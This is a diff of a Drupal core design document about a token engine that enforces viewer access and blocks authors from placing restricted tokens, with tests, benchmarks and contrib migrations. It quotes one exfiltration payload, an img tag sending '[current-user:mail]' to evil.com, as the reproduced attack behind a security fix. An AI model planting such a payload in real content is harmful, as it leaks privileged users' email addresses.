@@ -64,13 +64,37 @@ Four layers, kept deliberately separate:
 ### Resolution
 
 Resolution is access-checked against the viewer - the account that will see the
-output (defaults to the current user, but settable, e.g. the recipient of a
-queued email). When the access check fails, the token renders empty and is never handed to the legacy hooks as a fallback (which would have produced the value with no access check).
+output (e.g. the recipient of a queued email). Enforcement is **tiered**, keyed
+on whether the caller identifies that account: pass `viewer` (or a full
+`token_actor`) and every check below runs; pass neither and resolution runs in
+an unenforced tier that reproduces legacy output exactly, plus a deprecation
+notice. An earlier iteration silently defaulted the viewer to the request's
+current user and always enforced - which was itself a live behaviour break for
+viewer-less callers (cron mail, drush, pathauto ran as anonymous and got empty
+strings where legacy returned values). That default is gone; the engine no
+longer depends on the current user at all, and the BC test pins viewer-less
+output byte-for-byte against the legacy bridge
+([`TokenTieredEnforcementTest`](core/modules/system/tests/src/Kernel/Token/TokenTieredEnforcementTest.php)).
+
+In the enforced tier, when the access check fails the token renders empty and
+is never handed to the legacy hooks as a fallback (which would have produced
+the value with no access check).
 The check is layered: root entity view access, traversed-to entities at
 each `entity` deref, and field-level access on every read - the check token
 systems classically omit (entity access does not imply field access), which is
 how fields like `user.mail` leak. Each has a test that flips one permission,
 with a negative control showing the leak when the guard is removed.
+
+Modules that post-process replacements have a successor to
+`hook_tokens_alter()` for engine-resolved tokens:
+[`TokenResultAlterEvent`](core/lib/Drupal/Core/Token/Event/TokenResultAlterEvent.php)
+fires once per engine-resolved token after the chain's result is fully
+composed but before the access gate and cacheability bubbling, so a
+subscriber's replacement result has its access enforced and its cacheability
+bubbled exactly like a resolver's own. The asymmetry is deliberate and worth
+stating plainly: legacy-path tokens do not fire this event - they keep flowing
+through `hook_tokens_alter()` as they always have - so a module altering both
+kinds implements both until its tokens finish migrating.
 
 Rendering then decides how a value is emitted safely, per output context: HTML
 escapes it (no markup injection, no double-encode); email subject collapses
@@ -99,16 +123,33 @@ field token whose field they cannot view (field access checked against the
 author with no entity, so it answers permission-coarsely - `user.mail` needs
 `administer users`), or an attributed token declaring a
 [`place_permission`](core/lib/Drupal/Core/Token/Attribute/Token.php) they lack.
+The walker mirrors the engine's traversal rules - including implicit delta-0
+coercion on multi-value fields and the identity-zero segment - so the gate
+assesses the same chain the engine would resolve. That parity was an
+under-gating gap found by adversarial review (spellings like
+`[node:field_refs:entity:name]` walked one way by the engine and another by
+the validator) and is now pinned by
+[`TokenPlacementTraversalParityTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementTraversalParityTest.php).
 Gating is on presence, not on what changed, so editing content that already
 holds a restricted token challenges an author who is not entitled to it. A
 system-module `hook_entity_bundle_field_info_alter()` auto-attaches the
 constraint to every string and text field, and it fires on form/API submission
-(the untrusted path), leaving trusted programmatic writes alone. A chain that
-cannot be statically walked to its leaf (a polymorphic reference) is blocked only
-when the `system.token` `harden_placement` flag is on and the author lacks the
-`place unverifiable tokens` permission. Tested, with the privileged-viewer chain
-attack and a hardening/override pair, in
-[`TokenPlacementConstraintTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementConstraintTest.php).
+(the untrusted path), leaving trusted programmatic writes alone.
+
+The `system.token` `harden_placement` flag governs exactly one class of chain:
+those that cannot be statically walked to their leaf (a polymorphic
+reference). Those "unverifiable" chains are blocked only when hardening is on
+and the author lacks the `place unverifiable tokens` permission. Chains the
+walker CAN verify, and which reach data the author cannot access, block at
+save regardless of the flag - that is the security fix itself and is
+intentional, not governed by any opt-out. On upgrade,
+`system_update_12002()` gives existing sites `harden_placement: false` so
+unverifiable chains keep saving as they always did; new installs get `true`.
+Tested, with the privileged-viewer chain attack and a hardening/override pair,
+in
+[`TokenPlacementConstraintTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementConstraintTest.php)
+and
+[`TokenHardenPlacementUpdateTest`](core/modules/system/tests/src/Kernel/Token/TokenHardenPlacementUpdateTest.php).
 
 ### Reported issues this maps to
 
@@ -123,18 +164,25 @@ this repo, so their use-cases are reproduced via the same underlying mechanism):
 | [redirect #3591834](https://www.drupal.org/project/redirect/issues/3591834) | a token discloses a field of an entity the user cannot access | resolution / viewer | [`TokenEntityFieldChainTest`](core/modules/system/tests/src/Kernel/Token/TokenEntityFieldChainTest.php) (`testRootEntityViewAccessIsEnforced`) |
 | [token_filter #3587719](https://www.drupal.org/project/token_filter/issues/3587719) | author embeds `[…:mail]` in markup; exfiltrated when a privileged user views it | placement / author | [`TokenPlacementConstraintTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementConstraintTest.php) (`testChainToRestrictedFieldIsGatedByFieldAccess`) |
 | [metatag #3587720](https://www.drupal.org/project/metatag/issues/3587720) | same, in metatag fields | placement / author | [`TokenPlacementConstraintTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementConstraintTest.php) |
-| [drupal #3587726](https://www.drupal.org/project/drupal/issues/3587726) | sensitive tokens placeable by low-privilege authors | placement / author | [`TokenPlacementConstraintTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementConstraintTest.php) |
+| [drupal #3587726](https://www.drupal.org/project/drupal/issues/3587726) | sensitive tokens placeable by low-privilege authors | placement / author | [`TokenPlacementCurrentUserTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementCurrentUserTest.php) (exact `[current-user:mail]` repro) |
 
 The placement issues are the case resolution-access alone cannot close: the
 viewer is entitled to the value, so only stopping the author from placing the
 token prevents the leak.
 
-One limit: the placement tests demonstrate the *mechanism* against
-`[user:mail]` and entity-reference chains, which the gate walks to a field
-token. The literal token in those three issues is `[current-user:mail]`, and the
-gate does not yet cover it, because `current-user` is a legacy token-type alias
-not mapped to an entity type (see Open questions). The mechanism is what would
-gate it once that alias is mapped; it is not claimed as a complete fix today.
+The literal token in those three issues, `[current-user:mail]`, is now covered
+directly: `current-user` is declared as a root token (a `#[Token]` with an
+empty input type, resolving to the acting account's user entity), which makes
+the chain walkable by the placement gate straight into `entity:user` field
+access. The exact attack from #3587726 - an author without access to the mail
+field saving `<img src="http://evil.com/?u=[current-user:mail]">` in body
+text - is reproduced and blocked in
+[`TokenPlacementCurrentUserTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementCurrentUserTest.php),
+with a permitted author passing. Token-type names that differ from their
+entity type (`term` vs `taxonomy_term`) walk through the same gate via the
+entity-type mapper. Resolution-side, `current-user` resolves through the
+engine only in the enforced tier; viewer-less callers keep byte-identical
+legacy output.
 
 ## Backward compatibility
 
@@ -149,6 +197,19 @@ This is not a parallel system behind a flag. The new engine is a superset of the
 - The legacy hooks stay the source of truth for their tokens until they are
   migrated or removed. Migration is mechanical and incremental, per token, not a
   big-bang rewrite.
+- When two `#[Token]` classes do claim the same identity, the collision is no
+  longer silent: the winner is deterministic (module order - higher weight,
+  ties to the alphabetically last name, the same intuition as `hook_alter()`
+  ordering), the loser is logged as a warning naming both classes, and
+  `TokenResolverManager::getIdentityConflicts()` exposes the full list for a
+  status report. Pinned across both install orders in
+  [`TokenIdentityConflictTest`](core/modules/system/tests/src/Kernel/Token/TokenIdentityConflictTest.php).
+- The seam where legacy-hook replacements and engine replacements meet in one
+  string is test-proven, not assumed: six scenarios (HTML and plain-text
+  contexts, legacy values returning `Markup`, `#markup` render round-trip,
+  no-separator splices, the `callback` option) assert each provenance is
+  escaped exactly once, with `Html::escape()` as an independent oracle - see
+  [`TokenMixedProvenanceEscapingTest`](core/modules/system/tests/src/Kernel/Token/TokenMixedProvenanceEscapingTest.php).
 
 ## Performance
 
@@ -162,6 +223,28 @@ deterministic test instead: after resolving a single chain, only the traversed
 types' slices exist in the cache, while an installed-but-untraversed entity
 type's slice is absent. See
 [`TokenRegistryLazyLoadingTest`](core/modules/system/tests/src/Kernel/Token/TokenRegistryLazyLoadingTest.php).
+
+There are wall-clock numbers now too, from a reproducible harness
+([`TokenReplacementBenchmark`](core/modules/system/tests/src/Kernel/Token/TokenReplacementBenchmark.php),
+1000 iterations, results and full methodology to accompany the core issue).
+The honest summary:
+
+- Batch replacement (`Token::replaceMultiple()` with a shared chain-prefix
+  memo) is ≈1.7× faster than per-string replacement on a metatag-shaped
+  workload - 25 short strings with heavily shared chain prefixes, the exact
+  case raised in the design discussion.
+- Access enforcement is where the engine's cost lives: on 4-token multi-segment
+  chains resolved directly by the engine, enforcement accounts for ≈72% of the
+  cost (~182µs of ~252µs/op); the structural chain walk itself is ~70µs/op and
+  stable. On realistic mixed workloads (legacy + engine tokens together),
+  enforcement roughly doubles end-to-end `Token::replace()` time. "Merging
+  access results is surprisingly expensive" was predicted in the design
+  discussion; these numbers quantify it and make it optimizable.
+- One known cost regression is an open decision: contrib token's internal
+  `generate()` calls carry no viewer, so the new deprecation fires on every
+  legacy field-token resolution (~+24µs/op) - fix candidates are a
+  once-per-request guard on the deprecation, or threading the viewer through
+  contrib token (see Open questions).
 
 ## Challenges
 
@@ -192,14 +275,22 @@ I could here with tests:
   [`TokenDiscoveryAlterEventTest`](core/modules/system/tests/src/Kernel/Token/TokenDiscoveryAlterEventTest.php).
 - Actor-model access enforcement at the root, traversed, and field levels -
   [`TokenEntityFieldChainTest`](core/modules/system/tests/src/Kernel/Token/TokenEntityFieldChainTest.php).
+- Tiered enforcement: viewer-less callers get byte-identical legacy output
+  (pinned against the legacy bridge) while enforced callers get the full
+  access model, including `token_actor` equivalence and the
+  anonymous-viewer edge -
+  [`TokenTieredEnforcementTest`](core/modules/system/tests/src/Kernel/Token/TokenTieredEnforcementTest.php).
+- Post-resolution alteration with composed access and cacheability -
+  [`TokenResultAlterEventTest`](core/modules/system/tests/src/Kernel/Token/TokenResultAlterEventTest.php).
+- Escaping at the legacy/engine seam, each provenance escaped exactly once -
+  [`TokenMixedProvenanceEscapingTest`](core/modules/system/tests/src/Kernel/Token/TokenMixedProvenanceEscapingTest.php).
+- Placement-walker parity with the engine's traversal rules -
+  [`TokenPlacementTraversalParityTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementTraversalParityTest.php).
 
 There are almost certainly other use-cases we need to solve for, this is a
 work in progress.
 
 ## Open questions
-
-- I chose to respect view permissions on the base entity in resolveChain but I'm
-  pretty sure that will break BC, so I'd want a second opinion before we rely on it.
 
 - There's a hard cap on how deep a token chain can go (10 for now). I just picked
   a number, it should probably be a configurable per-site setting instead.
@@ -214,15 +305,28 @@ work in progress.
 - The placement gate (see Security model) is permission-coarse by necessity: at
   save time no entity is bound, so it checks the leaf field's access against the
   author with a null entity rather than a concrete record. It has known edges
-  that need scrutiny: legacy token-type aliases like `current-user` are not
-  mapped to an entity type, so `[current-user:mail]` is not walked; only base
-  fields on a chained-to entity type are field-access checked, not configurable
-  ones; it covers entity text fields only, not config text (mail templates) or
-  programmatic `Token::replace()`; and presence-gating means a low-privilege
-  editor re-saving grandfathered content can be challenged for a token they did
-  not add (intended, but contentious). How much of this to close, and whether a
-  complementary render-time format filter should back it for defence in depth,
-  is something we need to decide.
+  that need scrutiny: only base fields on a chained-to entity type are
+  field-access checked, not configurable ones; it covers entity text fields
+  only, not config text (mail templates) or programmatic `Token::replace()`;
+  and presence-gating means a low-privilege editor re-saving grandfathered
+  content can be challenged for a token they did not add - including, now that
+  the gate walks `current-user` chains, content that predates the gate
+  entirely. `harden_placement` deliberately does not soften that (it governs
+  only unverifiable chains), so how much friction is acceptable, and whether a
+  complementary render-time format filter should back the gate for defence in
+  depth, is something we need to decide.
+
+- The no-viewer deprecation currently fires on every viewer-less `generate()`
+  call, and contrib token's own field-token internals make such calls on every
+  legacy field-token resolution (~+24µs/op and a noisy log). Options: a
+  once-per-request guard on the deprecation, or threading the viewer through
+  contrib token's helpers (the right long-term fix, and what any
+  heavy token consumer will want to do anyway). Input welcome.
+
+- Contrib token's `fieldTokenInfoAlter()` is reproduced on the discovery alter
+  event ("phase 1"), but the trickier dynamic cases aren't all proven, and the
+  legacy hook is still in place. Phase 2 - actually removing the legacy path in
+  contrib token - hasn't been attempted.
 
 ## Where the code lives
 
@@ -231,8 +335,11 @@ work in progress.
   [resolution engine](core/lib/Drupal/Core/Token/TokenResolutionEngine.php), the
   lazy [registry](core/lib/Drupal/Core/Token/TokenRegistry.php),
   [typed-data field discovery](core/lib/Drupal/Core/Token/Discovery/TypedDataFieldDiscovery.php),
-  the [`#[Token]` attribute](core/lib/Drupal/Core/Token/Attribute/Token.php), and
-  the [locale-aware renderer](core/lib/Drupal/Core/Token/TokenRenderer.php).
+  the [`#[Token]` attribute](core/lib/Drupal/Core/Token/Attribute/Token.php),
+  the [locale-aware renderer](core/lib/Drupal/Core/Token/TokenRenderer.php), the
+  [result alter event](core/lib/Drupal/Core/Token/Event/TokenResultAlterEvent.php),
+  and identity-conflict detection in the
+  [resolver manager](core/lib/Drupal/Core/Token/TokenResolverManager.php).
 - Placement gate: the
   [`TokenPlacement` constraint + validator](core/lib/Drupal/Core/Token/Plugin/Validation/Constraint/)
   that walks a token's chain and checks field access against the author, the
@@ -247,7 +354,8 @@ work in progress.
 
 Three contrib modules were migrated as canaries. In each, one token was
 moved from its legacy `hook_tokens()` implementation to a `#[Token]` attributed
-resolver registered as a `token.resolver` service. The legacy hook is retained
+resolver in the module's `Plugin\Token` namespace - discovered from the
+attribute, no service registration. The legacy hook is retained
 in every case, so the token keeps working on Drupal versions without the engine;
 on the new engine the attributed resolver takes precedence and produces identical
 output. Each migration ships a four-part test: the resolver in isolation,
@@ -266,9 +374,7 @@ tests rather than the full module suites.
 
 Migrates `[array:join-path]` (each array value cleaned by Pathauto's alias
 cleaner, then joined with `/`) to
-[`ArrayJoinPathToken`](modules/contrib/pathauto/src/Token/ArrayJoinPathToken.php),
-registered in
-[`pathauto.services.yml`](modules/contrib/pathauto/pathauto.services.yml).
+[`ArrayJoinPathToken`](modules/contrib/pathauto/src/Plugin/Token/ArrayJoinPathToken.php).
 Tested by
 [`ArrayJoinPathTokenMigrationProofTest`](modules/contrib/pathauto/tests/src/Kernel/ArrayJoinPathTokenMigrationProofTest.php)
 and
@@ -277,8 +383,7 @@ and
 ### ECA
 
 Migrates `[node:entity_type]` (the entity type id) to
-[`NodeEntityTypeToken`](modules/contrib/eca/src/Token/NodeEntityTypeToken.php),
-registered in [`eca.services.yml`](modules/contrib/eca/eca.services.yml). ECA
+[`NodeEntityTypeToken`](modules/contrib/eca/src/Plugin/Token/NodeEntityTypeToken.php). ECA
 adds an `entity_type` token to every content entity type via
 `hook_token_info_alter()`; because a resolver is identified by a single
 `(input_type, name)` pair, the migration is scoped to the `node` type and the
@@ -290,9 +395,8 @@ and
 ### webform
 
 Migrates `[webform:id]` (the webform machine id) to
-[`WebformIdToken`](modules/contrib/webform/src/Token/WebformIdToken.php),
-registered in
-[`webform.services.yml`](modules/contrib/webform/webform.services.yml). Tested by
+[`WebformIdToken`](modules/contrib/webform/src/Plugin/Token/WebformIdToken.php).
+Tested by
 [`WebformIdTokenMigrationProofTest`](modules/contrib/webform/tests/src/Kernel/WebformIdTokenMigrationProofTest.php)
 and
 [`TokenEngineBackwardCompatibilityTest`](modules/contrib/webform/tests/src/Kernel/TokenEngineBackwardCompatibilityTest.php).
